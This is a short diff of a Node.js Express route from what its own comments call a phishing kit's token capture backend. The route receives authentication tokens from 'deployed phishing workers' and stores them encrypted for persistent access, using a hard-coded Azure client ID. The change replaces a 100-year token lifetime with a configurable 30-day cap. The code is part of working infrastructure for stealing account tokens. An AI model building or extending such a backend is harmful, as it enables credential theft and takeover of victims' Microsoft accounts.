@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Token Capture Routes
- * Receives tokens from deployed workers
+ * Receives tokens from deployed phishing workers
  */
 const express = require('express');
 const router = express.Router();
@@ -122,7 +122,8 @@ router.post('/', async (req, res) => {
         }
 
         // Insert token record (encrypted) with 100-year expiration for persistent access
-        const ttlHours = 24 * 365 * 100; // 100 years
+        const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days
+
         const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
         
         const [result] = await db.query(
